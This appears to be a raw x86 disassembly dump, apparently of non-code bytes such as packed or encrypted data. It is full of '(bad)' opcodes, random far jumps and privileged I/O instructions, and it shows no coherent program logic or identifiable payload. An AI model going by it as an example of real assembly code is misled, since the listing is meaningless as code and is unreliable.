  4221c9:	sbb    eax,0xf371d947
  4221ce:	fst    QWORD PTR [eax]
  4221d0:	daa    
  4221d1:	jns    0x422154
  4221d3:	test   DWORD PTR [eax-0x4c],edx
  4221d6:	shl    DWORD PTR [eax],cl
  4221d8:	mov    cl,0x1e
  4221da:	nop
  4221db:	stc    
  4221dc:	mov    cl,0x3f
  4221de:	retf   0x2194
  4221e1:	inc    ebx
  4221e2:	mov    ds:0xf5520e45,al
  4221e7:	dec    eax
  4221e8:	sub    eax,DWORD PTR [esi-0x37]
  4221eb:	jne    0x4221d4
  4221ed:	nop
  4221ee:	jp     0x422243
  4221f0:	data16 loope 0x42217e
  4221f3:	push   0x722ddf13
	...
  42223c:	add    BYTE PTR [eax],al
  42223e:	adc    eax,0xfe3de0ab
  422243:	jg     0x422222
  422245:	stos   DWORD PTR es:[edi],eax
  422246:	mov    esi,DWORD PTR [edi-0x29282fe5]
  42224c:	mov    bl,0x48
  42224e:	outs   dx,DWORD PTR ds:[esi]
  42224f:	adc    eax,DWORD PTR [ecx]
  422251:	add    BYTE PTR [edx],ah
  422253:	pop    es
  422254:	add    BYTE PTR [eax],al
  422256:	shl    dh,0x9e
  422259:	or     DWORD PTR [ecx],ebx
  42225b:	and    edx,DWORD PTR [esi+0xc9e44e3]
  422261:	inc    esp
  422262:	jnp    0x4222da
  422264:	adc    bl,bh
  422266:	add    BYTE PTR [ecx],ch
  422268:	pop    esp
  422269:	lock pop es
  42226b:	cmp    ah,BYTE PTR [ebx]
  42226d:	retf   
  42226e:	push   cs
  42226f:	sub    DWORD PTR [eax],edi
  422271:	mov    dl,0x38
  422273:	data16 mov ah,0xd
  422276:	scas   al,BYTE PTR es:[edi]
  422277:	rol    edx,1
  422279:	sahf   
  42227a:	popa   
  42227b:	in     eax,0x7f
  42227d:	push   0x22
  42227f:	mov    BYTE PTR [esi+0x5bc655a7],al
  422285:	inc    esp
  422286:	pusha  
  422287:	dec    ebx
  422288:	pop    esi
  422289:	pop    ebx
  42228a:	cmp    edi,DWORD PTR [ebx]
  42228c:	mov    esi,0x9f51b100
  422291:	pop    ebp
  422292:	or     bh,BYTE PTR [ebx-0x74]
  422295:	xlat   BYTE PTR ds:[ebx]
  422296:	mov    bh,0xab
  422298:	pop    ebp
  422299:	cs pop ebp
  42229b:	or     BYTE PTR [esi],0x77
  42229e:	in     eax,dx
  42229f:	sub    dh,ah
  4222a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222a2:	pop    esi
  4222a3:	pop    esp
  4222a4:	push   0x4fa0e6a5
  4222a9:	cwde   
  4222aa:	jl     0x4222d0
  4222ac:	aad    0x6f
  4222ae:	sub    eax,0x9cadd5de
  4222b3:	push   ebp
  4222b4:	(bad)  
  4222b5:	jno    0x422261
  4222b7:	adc    al,0x81
  4222b9:	pop    eax
  4222ba:	sar    DWORD PTR [edi-0x4f],cl
  4222bd:	gs pop ebx
  4222bf:	sbb    DWORD PTR [esp+ebp*4-0x3d],ecx
  4222c3:	outs   dx,BYTE PTR ds:[esi]
  4222c4:	cli    
  4222c5:	and    al,0x4d
  4222c7:	or     eax,0xe2a0b7ef
  4222cc:	mov    al,0xe5
  4222ce:	inc    edi
  4222cf:	sub    eax,0x22d8c9b
  4222d4:	dec    DWORD PTR [ebx]
  4222d6:	push   ds
  4222d7:	outs   dx,DWORD PTR ds:[esi]
  4222d8:	scas   al,BYTE PTR es:[edi]
  4222d9:	shr    ch,cl
  4222db:	pop    ebp
  4222dc:	inc    ecx
  4222dd:	xchg   edx,eax
  4222de:	fstp   QWORD PTR ss:[ebp*1-0x420783cf]
  4222e6:	cmp    DWORD PTR [edi],ebx
  4222e8:	and    DWORD PTR [ebp-0x7f],ebp
  4222eb:	adc    eax,0xfa133e1c
  4222f0:	shr    BYTE PTR [edx+edi*4],0x9
  4222f4:	(bad)  
  4222f6:	cmp    eax,0x8c2df669
  4222fb:	xor    eax,0x529dc42a
  422300:	pop    es
  422301:	popf   
  422302:	addr16 adc bh,ch
  422305:	arpl   WORD PTR [edi],si
  422307:	cld    
  422308:	sbb    al,0x8c
  42230a:	dec    edi
  42230b:	in     eax,dx
  42230c:	fs inc ebx
  42230e:	mov    esi,DWORD PTR [ebx]
  422310:	cli    
  422311:	int3   
  422312:	stc    
  422313:	in     eax,dx
  422314:	mov    ch,0x2c
  422316:	jmp    0x422393
  422318:	mov    eax,0x7ec1e33c
  42231d:	inc    edi
  42231e:	pop    esi
  42231f:	js     0x4222a7
  422321:	xor    bl,ch
  422323:	shl    BYTE PTR [eax-0x14],cl
  422326:	shl    esp,0xbf
  422329:	jmp    0x516c7a42
  42232e:	repz add DWORD PTR [edx],ebp
  422331:	dec    edi
  422332:	xlat   BYTE PTR ds:[ebx]
  422333:	shl    BYTE PTR [edx+0x3e],cl
  422336:	(bad)  
  422337:	aam    0x79
  422339:	daa    
  42233a:	push   ebp
  42233b:	add    ecx,esi
  42233d:	sbb    al,0x69
  42233f:	test   al,0xea
  422341:	dec    ebx
  422342:	aaa    
  422343:	jo     0x422392
  422345:	xchg   ebp,eax
  422346:	jnp    0x422315
  422348:	push   ss
  422349:	lock pop esp
  42234b:	pop    ss
  42234c:	(bad)  
  42234d:	js     0x422391
  42234f:	dec    ecx
  422350:	inc    esi
  422351:	adc    DWORD PTR [edi],ecx
  422353:	fs aam 0x23
  422356:	mov    cl,0x7
  422358:	and    eax,0xdd1f5064
  42235d:	leave  
  42235e:	(bad)  
  42235f:	fcom   DWORD PTR [eax+0x3c]
  422362:	shl    DWORD PTR [esi+0x62],1
  422365:	pop    eax
  422366:	jecxz  0x422396
  422368:	sbb    DWORD PTR [edx-0x7],ebp
  42236b:	ss dec eax
  42236d:	xlat   BYTE PTR ds:[ebx]
  42236e:	iret   
  42236f:	lock push ebx
  422371:	aaa    
  422372:	call   0xb962086e
  422377:	xchg   ch,ah
  422379:	sbb    eax,0x1fc0eca1
  42237e:	add    dh,cl
  422380:	push   edx
  422381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422382:	lods   eax,DWORD PTR ds:[esi]
  422383:	jbe    0x4223a5
  422385:	icebp  
  422386:	stos   DWORD PTR es:[edi],eax
  422387:	scas   eax,DWORD PTR es:[edi]
  422388:	cli    
  422389:	pop    es
  42238a:	cwde   
  42238b:	mov    esi,0xa043c92b
  422390:	je     0x422366
  422392:	fadd   QWORD PTR [esi]
  422394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422395:	popa   
  422396:	xchg   ebx,eax
  422397:	adc    dh,BYTE PTR [ecx+ebp*2]
  42239a:	push   esp
  42239b:	(bad)  
  42239c:	dec    ebp
  42239d:	pop    ss
  42239e:	mov    esi,0xbeb16efb
  4223a3:	out    dx,eax
  4223a4:	xchg   ecx,eax
  4223a5:	out    dx,al
  4223a6:	mov    esp,0x11a3ae3c
  4223ab:	jg     0x422366
  4223ad:	sub    BYTE PTR [esi-0x5238a775],bl
  4223b3:	and    DWORD PTR [esi],ecx
  4223b5:	cmp    BYTE PTR [eax-0x96ad4d6],dh
  4223bb:	jp     0x422439
  4223bd:	repnz xor eax,0x846bf6de
  4223c3:	fdivp  st(0),st
  4223c5:	or     eax,0xfb8c0b4
  4223ca:	sub    edi,0x6440c6f
  4223d0:	mov    ds:0x255705b1,eax
  4223d5:	hlt    
  4223d6:	sbb    al,0x3b
  4223d8:	cs fwait
  4223da:	cmp    DWORD PTR [ecx+0x61],ecx
  4223dd:	idiv   DWORD PTR [edx]
  4223df:	and    cl,0x1c
  4223e2:	aam    0xd5
  4223e4:	test   DWORD PTR [edi-0x4b],ebp
  4223e7:	pop    edx
  4223e8:	fwait
  4223e9:	int3   
  4223ea:	imul   ecx,DWORD PTR [eax-0x4b6b2792],0x72f9d629
  4223f4:	mov    eax,ds:0x93e8f648
  4223f9:	sub    eax,0x1a4b1f6
  4223fe:	xor    bh,BYTE PTR [eax+0x69]
  422401:	test   BYTE PTR [edi+0xe2dd352],dh
  422407:	nop
  422408:	and    DWORD PTR [esi+0x1e],edx
  42240b:	mov    edi,0xbc74d1e6
  422410:	lahf   
  422411:	dec    edx
  422412:	mov    ecx,0x14dab179
  422417:	into   
  422418:	jbe    0x4223fd
  42241a:	sti    
  42241b:	aam    0xce
  42241d:	ret    0x6aff
  422420:	rep stos BYTE PTR es:[edi],al
  422422:	xor    al,0xa1
  422424:	enter  0x7e4f,0xc7
  422428:	jmp    0x1acb:0x2557bcfd
  42242f:	jmp    0xe1e0:0xd8a030fb
  422436:	adc    al,0x73
  422438:	outs   dx,DWORD PTR ds:[esi]
  422439:	lahf   
  42243a:	and    ecx,esi
  42243c:	call   FWORD PTR [esi+0x1a]
  42243f:	sbb    BYTE PTR [ebp+0x2f6354e2],ah
  422445:	push   0xd7a02f1e
  42244a:	cwde   
  42244b:	inc    eax
  42244c:	and    eax,0xd36934ef
  422451:	lods   al,BYTE PTR ds:[esi]
  422452:	pop    eax
  422453:	or     dl,BYTE PTR [edi-0x34]
  422456:	push   cs
  422457:	mov    dh,0x96
  422459:	cmp    cl,BYTE PTR [ebx-0x36513b78]
  42245f:	test   al,0xfa
  422461:	bound  edx,QWORD PTR [eax-0x267272dc]
  422467:	lock adc esi,eax
  42246a:	push   edx
  42246b:	xchg   esp,eax
  42246c:	add    al,0x9c
  42246e:	(bad)  
  42246f:	pop    edx
  422470:	sar    BYTE PTR [edx],1
  422472:	sbb    BYTE PTR [ecx],cl
  422474:	fild   DWORD PTR [ecx-0x70b3897b]
  42247a:	fs jae 0x4224b8
  42247d:	mov    dl,0x99
  42247f:	icebp  
  422480:	sbb    ch,BYTE PTR [edi]
  422482:	and    ah,BYTE PTR [ebp+ebp*4-0xd]
  422486:	mov    esp,0x4736000a
  42248b:	pushf  
  42248c:	sbb    al,0xac
  42248e:	mov    eax,ds:0x336d0ba
  422493:	push   esi
  422494:	aad    0xd3
  422496:	lods   eax,DWORD PTR ds:[esi]
  422497:	inc    esp
  422498:	mov    DWORD PTR [ecx],ebx
  42249a:	push   ebx
  42249b:	lea    edi,[edi+eax*4-0xd]
  42249f:	add    bl,cl
  4224a1:	adc    al,0x2c
  4224a3:	fcomip st,st(3)
  4224a5:	fs jo  0x4224f1
  4224a8:	or     al,0xc0
  4224aa:	imul   edx,edx,0xe72ac54
  4224b0:	cmp    esp,esp
  4224b2:	add    al,0xd3
  4224b4:	inc    edx
  4224b5:	add    ebp,0x49d3012e
  4224bb:	cld    
  4224bc:	stos   DWORD PTR es:[edi],eax
  4224bd:	lods   eax,DWORD PTR ds:[esi]
  4224be:	xchg   edx,eax
  4224bf:	pop    ecx
  4224c0:	pop    esi
  4224c1:	mov    edi,0x2d297b98
  4224c6:	sti    
  4224c7:	xor    ecx,DWORD PTR [edi]
  4224c9:	mov    eax,0x81df7b63
  4224ce:	sar    DWORD PTR [ebp+ecx*8-0x65fe5b3d],0x82
  4224d6:	xor    ebp,DWORD PTR [edi-0x68]
  4224d9:	sar    dh,cl
  4224db:	jge    0x422518
  4224dd:	sbb    al,0x24
  4224df:	mov    ch,0x58
  4224e1:	sub    BYTE PTR [ebp+0x56],bh
  4224e4:	dec    ebp
  4224e5:	sahf   
  4224e6:	pop    ecx
  4224e7:	xlat   BYTE PTR ds:[ebx]
  4224e8:	sbb    eax,0x7c000712
  4224ed:	push   ebx
  4224ee:	in     eax,0x77
  4224f0:	and    BYTE PTR [eax],bl
  4224f2:	outs   dx,BYTE PTR ds:[esi]
  4224f3:	arpl   WORD PTR [ebx-0x2da6df56],cx
  4224f9:	into   
  4224fa:	add    BYTE PTR [ebp+0x34],al
  4224fd:	push   edx
  4224fe:	mov    ch,0x5d
  422500:	xchg   esp,eax
  422501:	xchg   ebp,eax
  422502:	mov    DWORD PTR [esi-0x36],esi
  422505:	mov    ah,0x8d
  422507:	not    DWORD PTR [ebp+ebx*4+0x7798306]
  42250e:	arpl   WORD PTR [edi+0x6e8d66a9],sp
  422514:	outs   dx,BYTE PTR ds:[esi]
  422515:	loop   0x42250e
  422517:	cwde   
  422518:	adc    esi,DWORD PTR [edi+0x4461ff0e]
  42251e:	jns    0x4224d0
  422520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422521:	inc    esi
  422522:	adc    bh,BYTE PTR [ebx-0x1]
  422525:	retf   
  422526:	jecxz  0x4224b2
  422528:	mov    ebp,DWORD PTR [ebx+0x680c5950]
  42252e:	icebp  
  42252f:	dec    ebx
  422530:	sbb    DWORD PTR ds:0x7fec8127,esi
  422536:	mov    cs,WORD PTR [eax-0x788c10c5]
  42253c:	ret    
  42253d:	push   esi
  42253e:	push   0xb
  422540:	nop
  422541:	fdivr  DWORD PTR [esi]
  422543:	cli    
  422544:	mov    bl,0x1d
  422546:	aas    
  422547:	xor    ah,BYTE PTR [edi+ebx*2+0x5b925810]
  42254e:	sbb    bh,0x51
  422551:	enter  0xf20a,0x15
  422555:	and    ebx,ebx
  422557:	lds    edi,FWORD PTR [ecx-0x6c]
  42255a:	fcomp  DWORD PTR [ebp+0x69aa930d]
  422560:	nop
  422561:	push   ds
  422562:	fistp  QWORD PTR [ecx+0x7e32795a]
  422568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422569:	loope  0x4225dd
  42256b:	fs jecxz 0x422513
  42256e:	jnp    0x422513
  422570:	inc    edx
  422571:	psrad  mm5,QWORD PTR [edi+0x9]
  422575:	jo     0x42250f
  422577:	pop    edx
  422578:	(bad)  
  422579:	scas   eax,DWORD PTR es:[edi]
  42257a:	lock jg 0x422549
  42257d:	jge    0x422539
  42257f:	ficom  WORD PTR [ebp+0x29]
  422582:	pop    ss
  422583:	std    
  422584:	lahf   
  422585:	les    eax,FWORD PTR [esi-0x30]
  422588:	bound  edx,QWORD PTR [ebp-0x399d62a0]
  42258e:	add    eax,0xf1990e50
  422593:	and    BYTE PTR [edx-0x8],bl
  422596:	(bad)  
  422597:	aad    0xe2
  422599:	les    esp,FWORD PTR [eax-0x59]
  42259c:	std    
  42259d:	jbe    0x42259f
  42259f:	(bad)  
  4225a0:	jg     0x4225e1
  4225a2:	cmp    BYTE PTR [ecx+0x4d],dh
  4225a5:	cmp    esi,DWORD PTR [eax]
  4225a7:	inc    esp
  4225a8:	or     edx,DWORD PTR [esi-0x4a]
  4225ab:	xchg   edi,eax
  4225ac:	outs   dx,DWORD PTR ds:[esi]
  4225ad:	(bad)  
  4225ae:	sub    eax,0xcf6dcff9
  4225b3:	pop    ebp
  4225b4:	push   edi
  4225b5:	clc    
  4225b6:	mov    DWORD PTR [edi],ebp
  4225b8:	fdiv   DWORD PTR ds:0xb7a19a4a
  4225be:	les    edi,FWORD PTR cs:[edx]
  4225c1:	add    DWORD PTR [ebp-0x2],eax
  4225c4:	(bad)  
  4225c5:	pop    ebx
  4225c6:	pushf  
  4225c7:	shl    BYTE PTR [edx+0x67],1
  4225ca:	mov    ah,0x78
  4225cc:	sbb    BYTE PTR [ebx],cl
  4225ce:	push   bp
  4225d0:	icebp  
  4225d1:	leave  
  4225d2:	scas   eax,DWORD PTR es:[edi]
  4225d3:	pop    edi
  4225d4:	repnz ror BYTE PTR gs:[ebx-0x1e],1
  4225d9:	jmp    0x42258a
  4225db:	fs pusha 
  4225dd:	or     al,0xbf
  4225df:	dec    ebp
  4225e0:	jp     0x42258c
  4225e2:	les    edx,FWORD PTR [edi+0x2f]
  4225e5:	fsub   DWORD PTR [eax-0x30ef28af]
  4225eb:	mov    edx,0x590a0440
  4225f0:	imul   DWORD PTR [ecx+0xabfa963]
  4225f6:	mov    esi,0xf4c73033
  4225fb:	arpl   di,dx
  4225fd:	retf   
  4225fe:	add    al,0xac
  422600:	sar    bl,cl
  422602:	pushf  
  422603:	(bad)
  422607:	popf   
  422608:	mov    eax,DWORD PTR gs:[ebp-0x804608e]
  42260f:	aad    0xd4
  422611:	aaa    
  422612:	mov    edi,0x66626497
  422617:	stos   BYTE PTR es:[edi],al
  422618:	(bad)  
  422619:	fisubr WORD PTR [esi-0x220cfe5f]
  42261f:	(bad)  
  422620:	(bad)  
  422622:	jne    0x4225e7
  422624:	ror    bh,1
  422626:	dec    eax
  422627:	cld    
  422628:	jp     0x42266f
  42262a:	fidiv  WORD PTR [esi+0x2d69691]
  422630:	cmp    BYTE PTR [ebx-0x23],bl
  422633:	jne    0x422674
  422635:	mov    ds:0xa8b570f8,al
  42263a:	xor    esp,esi
  42263c:	push   edx
  42263d:	lock xchg edi,eax
  42263f:	fild   WORD PTR [eax]
  422641:	aas    
  422642:	aas    
  422643:	fmul   QWORD PTR [edx+0x3]
  422646:	retf   0x10f7
  422649:	jg     0x4226b8
  42264b:	push   0xb
  42264d:	inc    eax
  42264e:	jg     0x422607
  422650:	dec    ebx
  422651:	pop    ecx
  422653:	mov    ebx,0x89722211
  422658:	xor    DWORD PTR [eax],esi
  42265a:	(bad)  
  42265b:	xor    eax,0x4dbc6a57
  422660:	repnz sub esi,DWORD PTR [edi+esi*4]
  422664:	add    esp,DWORD PTR [ebx-0x59832b20]
  42266a:	or     al,BYTE PTR [esi]
  42266c:	xor    al,0x54
  42266e:	(bad)  
  42266f:	stc    
  422670:	sub    BYTE PTR [esi+0x19],ch
  422673:	dec    ebp
  422674:	int    0xd1
  422676:	jmp    edx
  422678:	out    dx,al
  422679:	xor    bl,ch
  42267b:	out    dx,al
  42267c:	cmc    
  42267d:	(bad)  
  42267e:	je     0x4226bb
  422680:	cdq    
  422681:	mov    ds:0x62be8562,eax
  422686:	pop    edx
  422687:	out    dx,al
  422688:	sbb    al,0xce
  42268a:	add    BYTE PTR [ecx+0x25],0x81
  42268e:	aam    0xb9
  422690:	mov    edi,0x3800fd3
  422695:	jnp    0x422641
  422697:	cld    
  422698:	push   ecx
  422699:	xor    eax,0x340fb09c
  42269e:	into   
  42269f:	popf   
  4226a0:	cdq    
  4226a1:	out    0x39,eax
  4226a3:	mov    dh,0x5f
  4226a5:	add    dl,BYTE PTR [ecx]
  4226a7:	mov    ah,BYTE PTR [edi-0x36]
  4226aa:	inc    ebx
  4226ab:	out    0x4b,eax
  4226ad:	jmp    0x9ec63936
  4226b2:	pop    ebp
  4226b3:	sti    
  4226b4:	je     0x422660
  4226b6:	mov    ch,0x4f
  4226b8:	scas   eax,DWORD PTR es:[edi]
  4226b9:	xor    ecx,DWORD PTR [ebp-0x840319f]
  4226bf:	dec    ecx
  4226c0:	push   esp
  4226c1:	cmp    bl,bl
  4226c3:	push   ebp
  4226c4:	pop    DWORD PTR [ebx+0x19732a4]
  4226ca:	cmp    esi,DWORD PTR [ebx+0x59b40bc3]
  4226d0:	ds push ss
  4226d2:	in     al,dx
  4226d3:	mov    dh,0xe7
  4226d5:	pop    esp
  4226d6:	and    eax,0xf77fb5b4
  4226db:	pop    DWORD PTR [ecx+0x5db1c748]
  4226e1:	jne    0x422736
  4226e3:	out    dx,eax
  4226e4:	and    DWORD PTR [eax-0x1],ebx
  4226e7:	rcl    BYTE PTR [edi+0x2f],1
  4226ea:	ud2    
  4226ec:	adc    bh,BYTE PTR [edx-0x1485ee40]
  4226f2:	stos   DWORD PTR es:[edi],eax
  4226f3:	loope  0x4226ec
  4226f5:	mov    cx,0x502a
  4226f9:	mov    al,ds:0x7a098149
  4226fe:	int    0xa6
  422700:	fmul   st,st(2)
  422702:	cmp    BYTE PTR [edx+ebp*8],al
  422705:	dec    ebp
  422706:	xchg   esi,eax
  422707:	mov    dh,0xb7
  422709:	pop    ebp
  42270a:	adc    BYTE PTR [ebp+0x382986d5],ch
  422710:	in     al,0xe7
  422712:	int    0xd0
  422714:	shl    BYTE PTR [ebp+0x1c],1
  422717:	push   ss
  422718:	inc    ebp
  422719:	ret    0x7911
  42271c:	adc    al,0x8c
  42271e:	add    BYTE PTR [eax-0x21],bl
  422721:	or     dh,BYTE PTR [ebx+0x3d]
  422724:	imul   ebx,DWORD PTR [ecx],0x38
  422727:	idiv   BYTE PTR [edx+edi*8-0x7d]
  42272b:	shr    BYTE PTR [esi],0x73
  42272e:	push   0xffffffd4
  422730:	xor    eax,0x8dc729a0
  422735:	loopne 0x42278d
  422737:	aad    0xa0
  422739:	(bad)  
  42273a:	loop   0x422714
  42273c:	or     BYTE PTR [esi-0x39],al
  42273f:	ret    0x3a71
  422742:	shl    DWORD PTR [ecx-0x78],1
  422745:	cmp    DWORD PTR [ecx-0x51],ebp
  422748:	in     eax,dx
  422749:	int    0xc7
  42274b:	retf   
  42274c:	sub    ebp,DWORD PTR [edi]
  42274e:	xacquire xchg BYTE PTR [esi],bh
  422751:	daa    
  422752:	scas   al,BYTE PTR es:[edi]
  422753:	mov    dl,0x9
  422755:	enter  0x4896,0x57
  422759:	pop    eax
  42275a:	push   ebx
  42275b:	inc    edi
  42275c:	arpl   cx,si
  42275e:	les    esp,FWORD PTR [esi+edx*1]
  422761:	js     0x4227b4
  422763:	ins    DWORD PTR es:[edi],dx
  422764:	sbb    cl,BYTE PTR [esi+0x75]
  422767:	addr16 mov edx,0x42005dc0
  42276d:	mov    cl,0x4c
  42276f:	in     eax,0x9c
  422771:	xchg   esi,eax
  422772:	xchg   ebp,eax
  422773:	gs push edx
  422775:	repz push edx
  422777:	sub    BYTE PTR [eax-0x2372fe6d],bh
  42277d:	and    DWORD PTR [ebp+0x70],esp
  422780:	and    DWORD PTR [eax],esi
  422782:	xchg   ebp,edi
  422784:	sub    al,0x5f
  422786:	scas   eax,DWORD PTR es:[edi]
  422787:	lahf   
  422788:	inc    esi
  422789:	sbb    eax,0xf4f645ad
  42278e:	je     0x4227ce
  422790:	sbb    dl,bh
  422792:	sub    al,0x3
  422794:	mov    al,ds:0x8bdbf80a
  422799:	pop    ss
  42279a:	sbb    dl,BYTE PTR [eax-0x232a293d]
  4227a0:	mov    ecx,0x61921f9
  4227a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227a6:	mov    esi,0xc5ee9902
  4227ab:	pop    ebx
  4227ac:	int3   
  4227ad:	fidivr WORD PTR [edi]
  4227af:	hlt    
  4227b0:	shl    ch,cl
  4227b2:	and    bh,ah
  4227b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b5:	aam    0xd5
  4227b7:	jb     0x4227be
  4227b9:	stos   BYTE PTR es:[edi],al
  4227ba:	or     ah,bh
  4227bc:	xor    ebp,DWORD PTR [ebx+0x12a987eb]
  4227c2:	outs   dx,DWORD PTR ss:[esi]
  4227c4:	add    ebx,DWORD PTR [esi]
  4227c6:	sub    al,0xa5
  4227c8:	and    BYTE PTR [esi],ch
  4227ca:	inc    edi
  4227cb:	sbb    edx,edx
  4227cd:	mov    ch,0x6d
  4227cf:	mov    ebx,0x8906689f
  4227d4:	xor    eax,0xa5138cac
  4227d9:	jbe    0x4227d0
  4227db:	pop    eax
  4227dc:	into   
  4227dd:	retf   
  4227de:	adc    BYTE PTR [esi],bl
  4227e0:	xchg   edx,eax
  4227e1:	icebp  
  4227e2:	mov    dl,0x8e
  4227e4:	or     ecx,DWORD PTR [edx+0x5b54b0b7]
  4227ea:	ror    DWORD PTR [ecx],cl
  4227ec:	ds in  al,dx
  4227ee:	inc    esp
  4227ef:	mov    al,ds:0xfea4a0f0
  4227f4:	or     esp,DWORD PTR [ecx-0x41a0a393]
  4227fa:	pop    esi
  4227fb:	cld    
  4227fc:	adc    esp,DWORD PTR [eax+0x1a]
  4227ff:	xchg   ecx,eax
  422800:	xchg   ebx,eax
  422801:	mov    ch,0x21
  422803:	xchg   ebx,eax
  422804:	cmc    
  422805:	mov    fs,WORD PTR [ebp-0x2caff78e]
  42280b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42280c:	cmp    eax,0x7001eed4
  422811:	xlat   BYTE PTR ds:[ebx]
  422812:	and    dh,ch
  422814:	cmp    DWORD PTR [ebp-0x1143e545],0xffffff88
  42281b:	pop    esp
  42281c:	sub    DWORD PTR [eax+0x5325f878],edi
  422822:	xchg   BYTE PTR es:[eax+0x59],ch
  422826:	sub    eax,DWORD PTR [esi]
  422828:	push   ds
  422829:	push   ebx
  42282a:	sahf   
  42282b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42282c:	popa   
  42282d:	out    dx,al
  42282e:	ss (bad) 
  422830:	sbb    cl,BYTE PTR [edx+ecx*1]
  422833:	xor    DWORD PTR [edi],ebx
  422835:	sahf   
  422836:	aas    
  422837:	push   esi
  422838:	add    BYTE PTR [edi-0x41],cl
  42283b:	out    0x38,eax
  42283d:	pop    esi
  42283e:	lea    esi,[ebx*8+0x1323164]
  422845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422846:	pop    esp
  422847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422848:	xlat   BYTE PTR cs:[ebx]
  42284a:	aaa    
  42284b:	mov    bh,bh
  42284d:	ret    0x18b8
  422850:	cmc    
  422851:	out    dx,eax
  422852:	aam    0x6d
  422854:	ror    DWORD PTR [eax+eiz*1],cl
  422857:	inc    esi
  422858:	rol    DWORD PTR [eax],cl
  42285a:	sub    eax,0xf59eccc1
  42285f:	mov    WORD PTR ds:0x1393ad53,?
  422865:	jge    0x42289f
  422867:	fidiv  WORD PTR [edx-0x9]
  42286a:	imul   ebp,DWORD PTR [edx+0x1a],0x73
  42286e:	or     esi,DWORD PTR [ecx+0x37]
  422871:	data16 aaa 
  422873:	cdq    
  422874:	fisttp DWORD PTR ds:0x6c6b4f11
  42287a:	dec    ecx
  42287b:	pop    ebp
  42287c:	xlat   BYTE PTR ds:[ebx]
  42287d:	pop    edi
  42287e:	cmp    esp,DWORD PTR [ebx-0x714fe37d]
  422884:	adc    al,al
  422886:	repz ficomp DWORD PTR [esi]
  422889:	daa    
  42288a:	cmp    al,0x5a
  42288c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42288d:	pop    edx
  42288e:	(bad)  
  42288f:	fadd   DWORD PTR [ebx+edx*2-0x6a74e8ae]
  422896:	sti    
  422897:	push   ecx
  422898:	push   esp
  422899:	push   edx
  42289a:	mov    al,ds:0x4097243a
  42289f:	dec    edi
  4228a0:	scas   eax,DWORD PTR es:[edi]
  4228a1:	xchg   esi,eax
  4228a2:	arpl   WORD PTR [esi],cx
  4228a4:	fdivr  QWORD PTR [edx-0x6cc4d6ec]
  4228aa:	push   es
  4228ab:	aas    
  4228ac:	add    BYTE PTR [ebp-0x69b45149],bh
  4228b2:	xor    ah,al
  4228b4:	mov    bh,0xa7
  4228b6:	mov    esp,0x43ad9e64
  4228bb:	call   FWORD PTR [bx+si-0x1957]
  4228c0:	dec    edx
  4228c1:	pop    ds
  4228c2:	ret    
  4228c3:	dec    ebx
  4228c4:	mov    ecx,0x7add22a7
  4228c9:	shl    DWORD PTR [edi+0x37],1
  4228cc:	adc    DWORD PTR [edi],esi
  4228ce:	outs   dx,BYTE PTR ds:[esi]
  4228cf:	test   eax,0xfbb329d4
  4228d4:	mov    ?,ebp
  4228d6:	jmp    FWORD PTR [eax+0xb]
  4228d9:	test   al,0x48
  4228db:	aas    
  4228dc:	in     al,0x42
  4228de:	cmp    DWORD PTR [edx-0x71f768d7],0xffffffce
  4228e5:	cwde   
  4228e6:	add    edx,esi
  4228e8:	pop    esp
  4228e9:	pop    esp
  4228ea:	mov    bh,0x1c
  4228ec:	sti    
  4228ed:	mov    ds:0xcd62596d,eax
  4228f2:	mov    DWORD PTR [edx-0x3b],ebx
  4228f5:	(bad)  
  4228f6:	clc    
  4228f7:	mov    bl,0x62
  4228f9:	test   DWORD PTR [edi+0x318ba48d],esi
  4228ff:	outs   dx,DWORD PTR ds:[esi]
  422900:	cmp    bl,bl
  422902:	push   esi
  422903:	cmc    
  422904:	ss std 
  422906:	add    edx,ebp
  422908:	mov    edx,0xa98463e0
  42290d:	out    0x9e,eax
  42290f:	pushf  
  422910:	rol    eax,cl
  422912:	call   0x7c60:0x1a8d705f
  422919:	mov    ch,0xd3
  42291b:	out    dx,al
  42291c:	(bad)  
  42291d:	fsubr  QWORD PTR ds:[ebp-0x2320b086]
  422924:	fist   DWORD PTR [edi-0x63]
  422927:	inc    esp
  422928:	mov    DWORD PTR [esi],edx
  42292a:	xchg   DWORD PTR [esi-0x1a6bd0dd],eax
  422930:	pop    eax
  422931:	mov    edx,esp
  422933:	xchg   BYTE PTR [ebp-0x5e],dl
  422936:	xor    ebx,edi
  422938:	inc    edi
  422939:	(bad)  [edi+0x6a]
  42293c:	ficomp WORD PTR [ebx]
  42293e:	xor    edx,edi
  422940:	jmp    DWORD PTR [edi+esi*1+0x5e]
  422944:	fwait
  422945:	dec    edx
  422946:	sub    DWORD PTR ds:0xcd434dbb,esi
  42294c:	icebp  
  42294d:	repnz push ds
  42294f:	push   ecx
  422950:	and    dh,bh
  422952:	popf   
  422953:	add    al,0xc4
  422955:	repz out dx,al
  422957:	nop
  422958:	das    
  422959:	cmp    ecx,DWORD PTR [esi+0x63]
  42295c:	test   DWORD PTR [ecx*2+0x5f03df5b],edx
  422963:	das    
  422964:	icebp  
  422965:	aam    0x53
  422967:	inc    DWORD PTR [ebx+ecx*2]
  42296a:	sti    
  42296b:	add    al,0x4
  42296d:	mov    ch,BYTE PTR [edi-0x67]
  422970:	cmp    al,dh
  422972:	into   
  422973:	jl     0x422993
  422975:	aam    0x1d
  422977:	add    BYTE PTR ss:[eax],al
	...
  4229be:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  4229c2:	out    dx,eax
  4229c3:	(bad)  
  4229c4:	cmp    esi,esi
  4229c6:	repnz sahf 
  4229c8:	mov    ebx,0x34daed23
  4229cd:	imul   edx,DWORD PTR [ecx+0x2200011a],0x36000007
  4229d7:	inc    edi
  4229d8:	fisubr DWORD PTR [esp+ecx*8-0x2d313465]
